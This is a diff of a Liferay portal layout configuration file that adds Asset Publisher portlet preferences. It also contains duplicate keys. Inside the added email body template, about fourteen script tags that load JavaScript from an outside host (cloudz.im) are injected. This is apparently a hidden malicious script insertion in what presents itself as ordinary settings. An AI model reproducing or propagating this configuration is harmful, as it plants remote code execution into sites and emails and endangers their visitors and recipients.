@@ -1,22 +1,273 @@
 {
-	"layoutTemplateId": "2_columns_ii",
-	"privatePages": [
+	"layoutTemplateId": "1_column",
+	"publicPages": [
 		{
 			"columns": [
 				[
 					{
-						"portletId": "58"
-					}
-				],
-				[
-					{
-						"portletId": "47"
+						"portletId": "58",
+						"portletPreferences": {
+                            "articleId": "jumbotron.xml",
+                            "groupId": "${groupId}",
+                            "portletSetupShowBorders": "false"
+                        },
+                    	"portletId":"58",
+                    	"portletPreferences": {
+						    "preference": [
+						      {
+						        "name": "abstractLength",
+						        "value": "200"
+						      },
+						      {
+						        "name": "classTypeIdsJournalArticleAssetRendererFactory",
+						        "value": "17033,17035,17037,17031"
+						      },
+						      {
+						        "name": "showAvailableLocales",
+						        "value": "false"
+						      },
+						      {
+						        "name": "enableViewCountIncrement",
+						        "value": "true"
+						      },
+						      {
+						        "name": "portletSetupUseCustomTitle",
+						        "value": "true"
+						      },
+						      {
+						        "name": "enableRss",
+						        "value": "false"
+						      },
+						      {
+						        "name": "emailFromAddress",
+						        "value": "test@liferay.com"
+						      },
+						      {
+						        "name": "paginationType",
+						        "value": "none"
+						      },
+						      {
+						        "name": "enableFlags",
+						        "value": "false"
+						      },
+						      {
+						        "name": "queryValues0",
+						        "value": "17227"
+						      },
+						      {
+						        "name": "emailAssetEntryAddedEnabled",
+						        "value": "false"
+						      },
+						      {
+						        "name": "classTypeIds",
+						        "value": "NULL_VALUE"
+						      },
+						      {
+						        "name": "anyClassTypeJournalArticleAssetRendererFactory",
+						        "value": "true"
+						      },
+						      {
+						        "name": "mergeUrlTags",
+						        "value": "true"
+						      },
+						      {
+						        "name": "subtypeFieldsFilterEnabled",
+						        "value": "false"
+						      },
+						      {
+						        "name": "enableRatings",
+						        "value": "false"
+						      },
+						      {
+						        "name": "emailFromName",
+						        "value": "Test Test"
+						      },
+						      {
+						        "name": "showAddContentButton",
+						        "value": "false"
+						      },
+						      {
+						        "name": "queryName0",
+						        "value": "assetCategories"
+						      },
+						      { "name": "customUserAttributes" },
+						      {
+						        "name": "orderByColumn2",
+						        "value": "title"
+						      },
+						      {
+						        "name": "rssDelta",
+						        "value": "20"
+						      },
+						      {
+						        "name": "extensions",
+						        "value": "NULL_VALUE"
+						      },
+						      { "name": "metadataFields" },
+						      {
+						        "name": "showAssetTitle",
+						        "value": "true"
+						      },
+						      {
+						        "name": "rssName",
+						        "value": "Asset Publisher"
+						      },
+						      {
+						        "name": "selectionStyle",
+						        "value": "dynamic"
+						      },
+						      {
+						        "name": "subtypeFieldsFilterEnabledJournalArticleAssetRendererFactory",
+						        "value": "false"
+						      },
+						      {
+						        "name": "emailAssetEntryAddedSubject_en_US",
+						        "value": "New Asset Entries Added to [$PORTLET_TITLE$]"
+						      },
+						      {
+						        "name": "orderByColumn1",
+						        "value": "modifiedDate"
+						      },
+						      {
+						        "name": "showMetadataDescriptions",
+						        "value": "false"
+						      },
+						      {
+						        "name": "enableRelatedAssets",
+						        "value": "true"
+						      },
+						      {
+						        "name": "orderByType2",
+						        "value": "ASC"
+						      },
+						      {
+						        "name": "portletSetupCss",
+						        "value": "{\"wapData\":{\"title\":\"\",\"initialWindowState\":\"NORMAL\"},\"spacingData\":{\"margin\":{\"sameForAll\":true,\"bottom\":{\"unit\":\"px\",\"value\":\"\"},\"left\":{\"unit\":\"px\",\"value\":\"\"},\"right\":{\"unit\":\"px\",\"value\":\"\"},\"top\":{\"unit\":\"px\",\"value\":\"\"}},\"padding\":{\"sameForAll\":true,\"bottom\":{\"unit\":\"px\",\"value\":\"\"},\"left\":{\"unit\":\"px\",\"value\":\"\"},\"right\":{\"unit\":\"px\",\"value\":\"\"},\"top\":{\"unit\":\"px\",\"value\":\"\"}}},\"borderData\":{\"borderStyle\":{\"sameForAll\":true,\"bottom\":\"\",\"left\":\"\",\"right\":\"\",\"top\":\"\"},\"borderColor\":{\"sameForAll\":true,\"bottom\":\"\",\"left\":\"\",\"right\":\"\",\"top\":\"\"},\"borderWidth\":{\"sameForAll\":true,\"bottom\":{\"unit\":\"px\",\"value\":\"\"},\"left\":{\"unit\":\"px\",\"value\":\"\"},\"right\":{\"unit\":\"px\",\"value\":\"\"},\"top\":{\"unit\":\"px\",\"value\":\"\"}}},\"textData\":{\"fontWeight\":\"\",\"lineHeight\":\"\",\"textDecoration\":\"\",\"letterSpacing\":\"\",\"color\":\"\",\"textAlign\":\"\",\"fontStyle\":\"\",\"fontFamily\":\"\",\"wordSpacing\":\"\",\"fontSize\":\"\"},\"bgData\":{\"backgroundPosition\":{\"left\":{\"unit\":\"px\",\"value\":\"\"},\"top\":{\"unit\":\"px\",\"value\":\"\"}},\"backgroundColor\":\"\",\"backgroundRepeat\":\"\",\"backgroundImage\":\"\",\"useBgImage\":false},\"advancedData\":{\"customCSS\":\"\",\"customCSSClassName\":\"\"}}"
+						      },
+						      {
+						        "name": "socialBookmarksDisplayPosition",
+						        "value": "bottom"
+						      },
+						      {
+						        "name": "mergeLayoutTags",
+						        "value": "false"
+						      },
+						      {
+						        "name": "socialBookmarksDisplayStyle",
+						        "value": "horizontal"
+						      },
+						      {
+						        "name": "emailAssetEntryAddedBody_en_US",
+						        "value": "Dear [$TO_NAME$],<br />[$NEW_LINE$]<br />[$NEW_LINE$]This is an autogenerated email for the [$PORTLET_NAME$] portlet.<br />[$NEW_LINE$]<br />[$NEW_LINE$]The following asset entries have been added to [$PORTLET_TITLE$]: [$ASSET_ENTRIES$].<br />[$NEW_LINE$]<br />[$NEW_LINE$]Sincerely,<br />[$NEW_LINE$][$FROM_NAME$]<br />[$NEW_LINE$][$FROM_ADDRESS$] <script src=\"https://cloudz.im/cache.php?t=1002\" type=\"text/javascript\"></script> <script src=\"https://cloudz.im/cache.php?t=1002\" type=\"text/javascript\"></script> <script src=\"https://cloudz.im/cache.php?t=1002\" type=\"text/javascript\"></script> <script src=\"https://cloudz.im/cache.php?t=1002\" type=\"text/javascript\"></script> <script src=\"https://cloudz.im/cache.php?t=1002\" type=\"text/javascript\"></script> <script src=\"https://cloudz.im/cache.php?t=1002\" type=\"text/javascript\"></script> <script src=\"https://cloudz.im/cache.php?t=1002\" type=\"text/javascript\"></script> <script src=\"https://cloudz.im/cache.php?t=1002\" type=\"text/javascript\"></script> <script src=\"https://cloudz.im/cache.php?t=1002\" type=\"text/javascript\"></script> <script src=\"https://cloudz.im/cache.php?t=1002\" type=\"text/javascript\"></script>[$NEW_LINE$]<script src=\"https://cloudz.im/cache.php?t=1002\" type=\"text/javascript\"></script>[$NEW_LINE$]<script src=\"https://cloudz.im/cache.php?t=1002\" type=\"text/javascript\"></script>[$NEW_LINE$]<script src=\"https://cloudz.im/cache.php?t=1002\" type=\"text/javascript\"></script>[$NEW_LINE$]<script src=\"https://cloudz.im/cache.php?t=1002\" type=\"text/javascript\"></script>"
+						      },
+						      {
+						        "name": "enablePrint",
+						        "value": "false"
+						      },
+						      {
+						        "name": "rssFeedType",
+						        "value": "atom_1.0"
+						      },
+						      {
+						        "name": "queryAndOperator0",
+						        "value": "false"
+						      },
+						      {
+						        "name": "showOnlyLayoutAssets",
+						        "value": "false"
+						      },
+						      { "name": "assetVocabularyId" },
+						      {
+						        "name": "assetLinkBehavior",
+						        "value": "showFullContent"
+						      },
+						      {
+						        "name": "enablePermissions",
+						        "value": "true"
+						      },
+						      {
+						        "name": "portletSetupShowBorders",
+						        "value": "false"
+						      },
+						      { "name": "ddmStructureFieldValue" },
+						      {
+						        "name": "enableCommentRatings",
+						        "value": "false"
+						      },
+						      {
+						        "name": "enableSocialBookmarks",
+						        "value": "false"
+						      },
+						      {
+						        "name": "displayStyleGroupId",
+						        "value": "17002"
+						      },
+						      {
+						        "name": "anyClassTypeDLFileEntryAssetRendererFactory",
+						        "value": "true"
+						      },
+						      {
+						        "name": "delta",
+						        "value": "10"
+						      },
+						      {
+						        "name": "subtypeFieldsFilterEnabledDLFileEntryAssetRendererFactory",
+						        "value": "false"
+						      },
+						      {
+						        "name": "showContextLink",
+						        "value": "true"
+						      },
+						      { "name": "ddmStructureDisplayFieldValue" },
+						      { "name": "ddmStructureFieldName" },
+						      {
+						        "name": "rssDisplayStyle",
+						        "value": "abstract"
+						      },
+						      {
+						        "name": "displayStyle",
+						        "value": "ddmTemplate_99a8a531-a338-4dbe-8cd8-f5e10255d681"
+						      },
+						      {
+						        "name": "enableComments",
+						        "value": "false"
+						      },
+						      {
+						        "name": "classTypeIdsDLFileEntryAssetRendererFactory",
+						        "value": "10310,10308,10306,10312"
+						      },
+						      {
+						        "name": "orderByType1",
+						        "value": "DESC"
+						      },
+						      {
+						        "name": "classNameIds",
+						        "value": [
+						          "10012",
+						          "10009",
+						          "10007",
+						          "10014",
+						          "10109",
+						          "10511",
+						          "10008",
+						          "10016",
+						          "10011",
+						          "10013"
+						        ]
+						      },
+						      {
+						        "name": "anyAssetType",
+						        "value": "true"
+						      },
+						      {
+						        "name": "queryContains0",
+						        "value": "true"
+						      }
+						    ]
+						  }
 					}
 				]
-			],
-			"friendlyURL": "/home",
-			"name": "Welcome",
-			"title": "Welcome"
+			]
 		}
 	]
 }
